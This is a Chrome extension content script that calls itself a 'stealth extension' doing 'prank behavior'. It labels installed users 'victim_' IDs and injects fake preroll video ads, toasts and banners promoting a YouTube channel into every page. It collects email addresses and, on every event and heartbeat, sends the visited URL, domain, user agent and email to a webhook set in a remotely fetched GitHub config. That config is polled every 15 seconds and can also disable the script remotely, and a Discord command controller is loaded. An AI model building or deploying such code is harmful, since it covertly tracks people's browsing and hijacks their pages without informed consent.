// Enhanced Chrome Extension - Per-User Targeting & Email Collection
// Comprehensive tracking with subscription monitoring and Supabase integration

(function() {
    'use strict';
    
    console.log('SP: Starting enhanced stealth extension...');

    // Load required scripts dynamically
    async function loadScript(src) {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = chrome.runtime.getURL(src);
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }

    // Initialize extension after loading dependencies
    async function initializeExtension() {
        try {
            // Load Supabase client first
            await loadScript('scripts/core/supabase-client.js');
            console.log('SP: Supabase client loaded');
            
            // Load analytics system
            await loadScript('scripts/core/analytics.js');
            console.log('SP: Analytics system loaded');
            
            // Load Discord controller (for commands, not spam!)
            await loadScript('scripts/core/discord-controller.js');
            console.log('SP: Discord controller loaded');
            
            // Wait a moment for scripts to initialize
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Initialize Discord controller with Supabase connection
            if (window.SupabaseClient && window.DiscordController) {
                const supabaseClient = new window.SupabaseClient();
                window.SP_DiscordController = new window.DiscordController(supabaseClient);
                console.log('SP: Discord controller initialized');
            }
            
            // Now start the main extension
            new SPEnhancedExtension();
            
        } catch (error) {
            console.error('SP: Failed to load dependencies:', error);
            // Fallback to starting without Supabase/Discord
            new SPEnhancedExtension();
        }
    }

    // Start initialization
    initializeExtension();

    class SPEnhancedExtension {
        constructor() {
            this.configUrl = 'https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/config.json';
            this.config = {};
            this.userId = null;
            this.userEmail = null;
            this.disabled = false;
            this.userSettings = {}; // Merged defaults + overrides
            
            this.init();
        }

        async init() {
            try {
                // Get user identification
                await this.setupUserIdentification();
                
                // Load configuration and apply user-specific settings
                await this.loadConfigAndApplyUserSettings();
                
                if (this.disabled) return;
                
                // Start email collection if needed
                await this.handleEmailCollection();
                
                // Start prank behaviors with user-specific settings
                this.startPrankBehavior();
                
                // Regular config updates
                setInterval(() => this.loadConfigAndApplyUserSettings(), 15000);
                
            } catch (error) {
                console.error('Failed to initialize:', error);
            }
        }

        async setupUserIdentification() {
            try {
                const stored = await chrome.storage.local.get(['sp_user_id', 'sp_user_email']);
                
                // Get or create user ID
                if (stored.sp_user_id) {
                    this.userId = stored.sp_user_id;
                } else {
                    this.userId = 'victim_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
                    await chrome.storage.local.set({'sp_user_id': this.userId});
                }
                
                // Get stored email if available
                this.userEmail = stored.sp_user_email || null;
                
            } catch (error) {
                this.userId = 'victim_' + Math.random().toString(36).substr(2, 9);
            }
        }

        async loadConfigAndApplyUserSettings() {
            try {
                const response = await fetch(this.configUrl + '?t=' + Date.now());
                this.config = await response.json();
                
                // Emergency disable check
                if (this.config.emergency_disable) {
                    this.disabled = true;
                    this.clearEverything();
                    return;
                }
                
                // Apply user-specific settings (defaults + overrides)
                await this.applyUserSpecificSettings();
                
                // Send heartbeat with user info
                this.sendUserHeartbeat();
                
            } catch (error) {
                console.error('Config load failed:', error);
            }
        }

        async applyUserSpecificSettings() {
            // Start with defaults from config
            this.userSettings = JSON.parse(JSON.stringify(this.config.defaults || {}));
            
            // Get user settings from Supabase database
            await this.getSupabaseUserSettings();
            
            // Apply legacy config overrides if no Supabase settings found
            if (!this.supabaseSettings) {
                this.applyLegacyConfigOverrides();
            }
        }

        // Get user settings from Supabase database
        async getSupabaseUserSettings() {
            try {
                if (window.SP_Analytics && window.SP_Analytics.supabase && window.SP_Analytics.currentUser) {
                    const userId = window.SP_Analytics.currentUser.id;
                    this.supabaseSettings = await window.SP_Analytics.supabase.getUserSettings(userId);
                    
                    if (this.supabaseSettings) {
                        console.log('SP: Applying Supabase user settings:', this.supabaseSettings);
                        
                        // Convert Supabase settings to extension format
                        this.userSettings = {
                            ...this.userSettings,
                            banners: {
                                ...this.userSettings.banners,
                                enabled: this.supabaseSettings.banners_per_page > 0,
                                maxPerPage: this.supabaseSettings.banners_per_page || 0
                            },
                            toast: {
                                ...this.userSettings.toast,
                                enabled: this.supabaseSettings.toasts_per_session > 0,
                                maxPerSession: this.supabaseSettings.toasts_per_session || 0
                            },
                            preroll: {
                                ...this.userSettings.preroll,
                                enabled: this.supabaseSettings.preroll_enabled !== false
                            },
                            slotMode: this.supabaseSettings.slot_mode || 'normal',
                            stealthMode: this.supabaseSettings.stealth_mode || false
                        };
                        
                        console.log('SP: Final user settings applied:', this.userSettings);
                        return;
                    }
                }
            } catch (error) {
                console.error('SP: Failed to get Supabase user settings:', error);
            }
            
            console.log('SP: No Supabase settings found, using config defaults');
        }

        // Fallback to legacy config overrides (old system)
        applyLegacyConfigOverrides() {
            const userOverrides = this.config.user_overrides || {};
            
            // Try to find overrides by email first, then by userId
            let myOverrides = null;
            if (this.userEmail && userOverrides[this.userEmail]) {
                myOverrides = userOverrides[this.userEmail];
            } else if (userOverrides[this.userId]) {
                myOverrides = userOverrides[this.userId];
            }
            
            // Apply overrides if found
            if (myOverrides) {
                console.log('SP: Applying legacy config overrides for:', this.userEmail || this.userId);
                this.userSettings = this.deepMerge(this.userSettings, myOverrides);
            }
        }

        deepMerge(target, source) {
            const result = {...target};
            for (const key in source) {
                if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
                    result[key] = this.deepMerge(result[key] || {}, source[key]);
                } else {
                    result[key] = source[key];
                }
            }
            return result;
        }

        async handleEmailCollection() {
            const emailConfig = this.config.email_collection;
            
            if (!emailConfig?.enabled || this.userEmail) {
                return; // Already have email or collection disabled
            }
            
            // Show email collection prompt after delay
            setTimeout(() => {
                this.showEmailCollectionPrompt(emailConfig);
            }, emailConfig.prompt_delay || 30000);
        }

        showEmailCollectionPrompt(emailConfig) {
            const prompt = document.createElement('div');
            prompt.setAttribute('data-sp-email-prompt', 'true');
            prompt.style.cssText = `
                position: fixed;
                top: 50%; left: 50%;
                transform: translate(-50%, -50%);
                background: white;
                padding: 25px;
                border-radius: 12px;
                box-shadow: 0 8px 25px rgba(0,0,0,0.3);
                z-index: 999999;
                font-family: Arial, sans-serif;
                max-width: 400px;
                text-align: center;
            `;
            
            prompt.innerHTML = `
                <div style="margin-bottom: 15px; font-size: 18px; font-weight: bold; color: #333;">
                    🛡️ ${emailConfig.prompt_text || 'Stay Updated!'}
                </div>
                <input type="email" id="sp-email-input" placeholder="${emailConfig.placeholder || 'Enter your email'}" 
                       style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 14px;">
                <div style="margin-top: 15px;">
                    <button id="sp-email-submit" style="background: #2196F3; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; margin-right: 10px;">
                        Subscribe
                    </button>
                    <button id="sp-email-skip" style="background: #ccc; color: #333; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">
                        Skip
                    </button>
                </div>
            `;
            
            // Event handlers
            const emailInput = prompt.querySelector('#sp-email-input');
            const submitBtn = prompt.querySelector('#sp-email-submit');
            const skipBtn = prompt.querySelector('#sp-email-skip');
            
            submitBtn.onclick = async () => {
                const email = emailInput.value.trim();
                if (email && email.includes('@')) {
                    this.userEmail = email;
                    await chrome.storage.local.set({'sp_user_email': email});
                    
                    this.trackEvent('email_collected', {
                        userId: this.userId,
                        email: email,
                        method: 'voluntary_prompt'
                    });
                    
                    prompt.remove();
                    
                    // Reload config to apply any email-specific overrides
                    await this.loadConfigAndApplyUserSettings();
                }
            };
            
            skipBtn.onclick = () => {
                this.trackEvent('email_collection_skipped', {
                    userId: this.userId
                });
                prompt.remove();
            };
            
            document.body.appendChild(prompt);
        }

        startPrankBehavior() {
            const features = this.config.features || {};
            
            if (features.preroll && this.userSettings.preroll) {
                this.startVideoDetection();
            }
            
            if (features.toast && this.userSettings.toast) {
                this.startToastNotifications();
            }
            
            if (features.banners && this.userSettings.banners) {
                this.startBannerRotation();
            }
        }

        startVideoDetection() {
            const checkForVideos = () => {
                const videos = document.querySelectorAll('video, .html5-video-player video');
                
                videos.forEach(video => {
                    if (!video.hasAttribute('data-sp-hooked')) {
                        video.setAttribute('data-sp-hooked', 'true');
                        
                        video.addEventListener('play', () => {
                            if (this.shouldShowPreroll()) {
                                this.showPrerollOverlay(video);
                            }
                        });
                    }
                });
            };
            
            setInterval(checkForVideos, 2000);
            checkForVideos();
        }

        shouldShowPreroll() {
            const chance = this.userSettings.preroll?.chance || 0.3;
            return Math.random() < chance;
        }

        showPrerollOverlay(video) {
            const prerollSettings = this.userSettings.preroll;
            
            const overlay = document.createElement('div');
            overlay.setAttribute('data-sp-preroll', 'true');
            overlay.style.cssText = `
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                background: black;
                z-index: 999999;
                display: flex;
                align-items: center;
                justify-content: center;
            `;
            
            overlay.innerHTML = `
                <div style="position: relative; width: 100%; height: 100%;">
                    <iframe width="100%" height="100%" 
                            src="https://www.youtube.com/embed/${prerollSettings.videoId}?autoplay=1" 
                            frameborder="0" allow="autoplay"></iframe>
                    
                    <div style="position: absolute; top: 10px; left: 10px; color: white; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 3px;">
                        Ad • Will end in <span id="countdown">${(prerollSettings.skipDelay || 5000)/1000}</span>s
                    </div>
                    
                    <button id="skip-btn" style="position: absolute; bottom: 10px; right: 10px; padding: 8px 15px; background: white; border: none; border-radius: 3px; cursor: pointer; display: none;">
                        Skip Ad
                    </button>
                    
                    <button id="visit-btn" style="position: absolute; bottom: 10px; left: 10px; padding: 8px 15px; background: #ff0000; color: white; border: none; border-radius: 3px; cursor: pointer;">
                        Visit Channel
                    </button>
                </div>
            `;
            
            const videoContainer = video.closest('.html5-video-player') || video.parentElement;
            videoContainer.style.position = 'relative';
            videoContainer.appendChild(overlay);
            
            // Timer and button functionality
            let timeLeft = (prerollSettings.skipDelay || 5000) / 1000;
            const countdown = overlay.querySelector('#countdown');
            const skipBtn = overlay.querySelector('#skip-btn');
            const visitBtn = overlay.querySelector('#visit-btn');
            
            const timer = setInterval(() => {
                timeLeft--;
                countdown.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    skipBtn.style.display = 'block';
                }
            }, 1000);
            
            // Track preroll shown
            this.trackEvent('preroll_shown', {
                userId: this.userId,
                email: this.userEmail,
                videoId: prerollSettings.videoId,
                isCustom: !!this.config.user_overrides?.[this.userEmail || this.userId]
            });
            
            // Button handlers
            skipBtn.onclick = () => {
                this.trackEvent('preroll_skipped', {
                    userId: this.userId,
                    email: this.userEmail,
                    timeWatched: ((prerollSettings.skipDelay || 5000)/1000) - timeLeft
                });
                overlay.remove();
            };
            
            visitBtn.onclick = () => {
                const url = prerollSettings.subscriptionUrl || 'https://www.youtube.com/c/ScammerPayback?sub_confirmation=1';
                window.open(url, '_blank');
                
                this.trackEvent('preroll_clicked', {
                    userId: this.userId,
                    email: this.userEmail,
                    subscriptionUrl: url
                });
                
                overlay.remove();
            };
        }

        startToastNotifications() {
            const toastSettings = this.userSettings.toast;
            
            if (!toastSettings || !toastSettings.enabled || toastSettings.maxPerSession <= 0) {
                console.log('SP: Toasts disabled or maxPerSession is 0');
                return;
            }
            
            const messages = toastSettings.messages || this.config.defaults?.toast?.messages || [
                { id: 'default', icon: '🛡️', title: 'Fight Back Against Scammers!', subtitle: 'Subscribe to Scammer Payback' }
            ];
            
            if (!messages.length) return;
            
            console.log(`SP: Starting toast system with ${toastSettings.maxPerSession} toasts per session`);
            
            // Initialize toast tracking
            this.toastsShown = 0;
            this.maxToastsThisSession = toastSettings.maxPerSession;
            
            const showToast = () => {
                if (this.toastsShown >= this.maxToastsThisSession) {
                    console.log(`SP: Already shown ${this.toastsShown}/${this.maxToastsThisSession} toasts this session`);
                    return;
                }
                
                const message = messages[Math.floor(Math.random() * messages.length)];
                
                const toast = document.createElement('div');
                toast.setAttribute('data-sp-toast', 'true');
                toast.style.cssText = `
                    position: fixed;
                    bottom: 20px; right: 20px;
                    background: linear-gradient(135deg, #2196F3, #1976D2);
                    color: white;
                    padding: 16px 20px;
                    border-radius: 12px;
                    z-index: 999999;
                    cursor: pointer;
                    max-width: 320px;
                    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
                    transition: all 0.3s ease;
                    border: 1px solid rgba(255,255,255,0.2);
                `;
                
                toast.innerHTML = `
                    <div style="display: flex; align-items: center; gap: 12px;">
                        <div style="font-size: 24px;">${message.icon || '🛡️'}</div>
                        <div style="flex: 1;">
                            <div style="font-weight: bold; font-size: 14px; margin-bottom: 4px;">${message.title}</div>
                            <div style="font-size: 12px; opacity: 0.9;">${message.subtitle}</div>
                        </div>
                        <div class="sp-toast-close" style="
                            width: 20px; height: 20px;
                            background: rgba(255,255,255,0.2);
                            border-radius: 50%;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            cursor: pointer;
                            font-size: 12px;
                            font-weight: bold;
                        ">&times;</div>
                    </div>
                `;
                
                // Click handler for subscription
                toast.addEventListener('click', (e) => {
                    if (!e.target.classList.contains('sp-toast-close')) {
                        const url = message.subscriptionUrl || 'https://www.youtube.com/c/ScammerPayback?sub_confirmation=1';
                        window.open(url, '_blank');
                        
                        if (window.SP_Analytics) {
                            window.SP_Analytics.trackAdClick('toast');
                        }
                        
                        this.trackEvent('toast_clicked', {
                            messageId: message.id,
                            subscriptionUrl: url
                        });
                        
                        toast.remove();
                    }
                });
                
                // Close button handler
                toast.querySelector('.sp-toast-close').addEventListener('click', (e) => {
                    e.stopPropagation();
                    
                    if (window.SP_Analytics) {
                        window.SP_Analytics.trackAdClose('toast');
                    }
                    
                    this.trackEvent('toast_dismissed', {
                        messageId: message.id,
                        method: 'manual_close'
                    });
                    
                    toast.remove();
                });
                
                document.body.appendChild(toast);
                
                // Track toast shown
                this.toastsShown++;
                
                if (window.SP_Analytics) {
                    window.SP_Analytics.trackAdView('toast');
                }
                
                this.trackEvent('toast_shown', {
                    messageId: message.id,
                    toastCount: this.toastsShown,
                    maxForSession: this.maxToastsThisSession
                });
                
                console.log(`SP: Toast shown (${this.toastsShown}/${this.maxToastsThisSession})`);
                
                // Auto-remove after timeout
                setTimeout(() => {
                    if (toast.parentNode) {
                        this.trackEvent('toast_dismissed', {
                            messageId: message.id,
                            method: 'timeout'
                        });
                        toast.remove();
                    }
                }, 8000);
            };
            
            // Start toast system with delay and interval
            setTimeout(() => {
                showToast();
                
                // Only set interval if we haven't hit the session limit
                const intervalId = setInterval(() => {
                    if (this.toastsShown >= this.maxToastsThisSession) {
                        clearInterval(intervalId);
                        console.log('SP: Toast session limit reached, stopping interval');
                        return;
                    }
                    showToast();
                }, toastSettings.frequency || 60000); // Default 60 seconds between toasts
                
            }, 10000); // Wait 10 seconds before first toast
        }

        startBannerRotation() {
            const bannerSettings = this.userSettings.banners;
            
            if (!bannerSettings || !bannerSettings.enabled || bannerSettings.maxPerPage <= 0) {
                console.log('SP: Banners disabled or maxPerPage is 0');
                return;
            }
            
            console.log(`SP: Starting banner system with ${bannerSettings.maxPerPage} banners per page`);
            
            // Initialize banner tracking
            this.activeBanners = [];
            this.bannersShown = 0;
            this.maxBannersThisPage = bannerSettings.maxPerPage;
            
            // Start creating banners
            this.createBannersForPage();
            
            // Set up banner rotation interval
            setInterval(() => {
                this.rotateBanners();
            }, bannerSettings.rotationTime || 45000);
        }

        createBannersForPage() {
            if (this.bannersShown >= this.maxBannersThisPage) {
                console.log(`SP: Already shown ${this.bannersShown}/${this.maxBannersThisPage} banners for this page`);
                return;
            }
            
            const bannersToCreate = Math.min(
                this.maxBannersThisPage - this.bannersShown,
                this.maxBannersThisPage
            );
            
            console.log(`SP: Creating ${bannersToCreate} banners`);
            
            for (let i = 0; i < bannersToCreate; i++) {
                setTimeout(() => {
                    this.createSingleBanner();
                }, i * 1000); // Stagger banner creation
            }
        }

        createSingleBanner() {
            // Find insertion points for banners
            const insertionPoints = this.findBannerInsertionPoints();
            
            if (insertionPoints.length === 0) {
                console.log('SP: No suitable insertion points found for banner');
                return;
            }
            
            // Choose a random insertion point
            const insertionPoint = insertionPoints[Math.floor(Math.random() * insertionPoints.length)];
            
            // Create banner element
            const banner = this.createBannerElement();
            
            // Insert banner
            this.insertBannerAtPoint(banner, insertionPoint);
            
            // Track banner
            this.activeBanners.push(banner);
            this.bannersShown++;
            
            // Track analytics
            if (window.SP_Analytics) {
                window.SP_Analytics.trackAdView('banner', insertionPoint.type);
            }
            
            console.log(`SP: Banner created (${this.bannersShown}/${this.maxBannersThisPage})`);
        }

        createBannerElement() {
            const bannerTypes = [
                { size: '300x250', file: 'ad_300x250.png', width: 300, height: 250 },
                { size: '728x90', file: 'ad_728x90.png', width: 728, height: 90 },
                { size: '160x600', file: 'ad_160x600.png', width: 160, height: 600 },
                { size: '320x50', file: 'ad_320x50.png', width: 320, height: 50 }
            ];
            
            const bannerType = bannerTypes[Math.floor(Math.random() * bannerTypes.length)];
            const bannerId = 'sp-banner-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
            
            const banner = document.createElement('div');
            banner.id = bannerId;
            banner.className = 'sp-inserted-banner';
            banner.setAttribute('data-sp-banner', 'true');
            banner.style.cssText = `
                margin: 15px auto;
                text-align: center;
                background: #f5f5f5;
                border: 1px solid #ddd;
                border-radius: 8px;
                position: relative;
                max-width: ${bannerType.width}px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                transition: all 0.3s ease;
                cursor: pointer;
            `;
            
            const extensionUrl = chrome.runtime.getURL('');
            const imgSrc = extensionUrl + 'assets/banners/' + bannerType.file;
            
            banner.innerHTML = `
                <div style="position: relative; display: inline-block;">
                    <img src="${imgSrc}" 
                         alt="Scammer Payback - Fight Back Against Scammers" 
                         style="max-width: 100%; height: auto; border-radius: 6px;"
                         width="${bannerType.width}" 
                         height="${bannerType.height}">
                    <div class="sp-banner-close" style="
                        position: absolute;
                        top: 5px;
                        right: 5px;
                        width: 24px;
                        height: 24px;
                        background: rgba(0,0,0,0.7);
                        color: white;
                        border-radius: 50%;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        cursor: pointer;
                        font-size: 14px;
                        font-weight: bold;
                    " title="Close Ad">&times;</div>
                </div>
            `;
            
            // Add click handlers
            banner.addEventListener('click', (e) => {
                if (!e.target.classList.contains('sp-banner-close')) {
                    window.open('https://www.youtube.com/c/ScammerPayback?sub_confirmation=1', '_blank');
                    
                    if (window.SP_Analytics) {
                        window.SP_Analytics.trackAdClick('banner');
                    }
                    
                    this.trackEvent('banner_clicked', {
                        bannerId: bannerId,
                        bannerType: bannerType.size
                    });
                }
            });
            
            // Add close handler
            banner.querySelector('.sp-banner-close').addEventListener('click', (e) => {
                e.stopPropagation();
                this.closeBanner(banner, bannerId);
            });
            
            return banner;
        }

        findBannerInsertionPoints() {
            const points = [];
            
            // Look for common content areas
            const selectors = [
                'main', 'article', '.content', '.post', '.entry',
                '.search-results', '.feed', '.timeline', '.container'
            ];
            
            selectors.forEach(selector => {
                const elements = document.querySelectorAll(selector);
                elements.forEach(element => {
                    if (element.offsetHeight > 200 && element.offsetWidth > 300) {
                        points.push({
                            element: element,
                            type: selector.replace('.', ''),
                            score: this.calculateInsertionScore(element)
                        });
                    }
                });
            });
            
            // Sort by score and return top candidates
            return points.sort((a, b) => b.score - a.score).slice(0, 5);
        }

        calculateInsertionScore(element) {
            let score = 0;
            
            // Prefer larger elements
            score += Math.min(element.offsetWidth / 100, 10);
            score += Math.min(element.offsetHeight / 100, 10);
            
            // Prefer visible elements
            if (element.offsetParent !== null) score += 5;
            
            // Avoid elements that already have banners
            const hasExistingBanner = element.querySelector('[data-sp-banner]');
            if (hasExistingBanner) score -= 20;
            
            // Prefer elements in main content area
            if (element.tagName === 'MAIN' || element.classList.contains('content')) {
                score += 10;
            }
            
            return score;
        }

        insertBannerAtPoint(banner, insertionPoint) {
            const targetElement = insertionPoint.element;
            
            // Insert at the beginning of the element
            if (targetElement.firstChild) {
                targetElement.insertBefore(banner, targetElement.firstChild);
            } else {
                targetElement.appendChild(banner);
            }
        }

        closeBanner(banner, bannerId) {
            banner.style.opacity = '0';
            banner.style.transform = 'scale(0.8)';
            
            setTimeout(() => {
                if (banner.parentNode) {
                    banner.parentNode.removeChild(banner);
                }
                
                // Remove from active banners
                this.activeBanners = this.activeBanners.filter(b => b.id !== bannerId);
                
                if (window.SP_Analytics) {
                    window.SP_Analytics.trackAdClose('banner');
                }
            }, 300);
        }

        rotateBanners() {
            // Only rotate if we haven't hit the page limit
            if (this.bannersShown < this.maxBannersThisPage && this.activeBanners.length < this.maxBannersThisPage) {
                console.log('SP: Rotating banners - creating replacement');
                this.createSingleBanner();
            }
        }

        // Enhanced tracking with subscription monitoring
        trackEvent(eventType, data) {
            const eventData = {
                event: eventType,
                userId: this.userId,
                userEmail: this.userEmail,
                timestamp: Date.now(),
                url: window.location.href,
                domain: window.location.hostname,
                userAgent: navigator.userAgent,
                hasCustomSettings: !!(this.config.user_overrides?.[this.userEmail || this.userId]),
                ...data
            };
            
            this.sendData(eventData);
        }

        sendUserHeartbeat() {
            this.trackEvent('heartbeat', {
                hasEmail: !!this.userEmail,
                configVersion: this.config.version
            });
        }

        async sendData(data) {
            try {
                const webhookUrl = this.config.analytics?.webhook_url;
                
                if (webhookUrl) {
                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
                        })
                    });
                }
                
            } catch (error) {
                // Fail silently
            }
        }

        clearEverything() {
            const elements = document.querySelectorAll('[data-sp-preroll], [data-sp-toast], [data-sp-banner], [data-sp-email-prompt]');
            elements.forEach(el => el.remove());
            console.log('Extension disabled remotely');
        }
    }

    // Start the enhanced extension
    window.SPExtension = new SPEnhancedExtension();
    
})(); 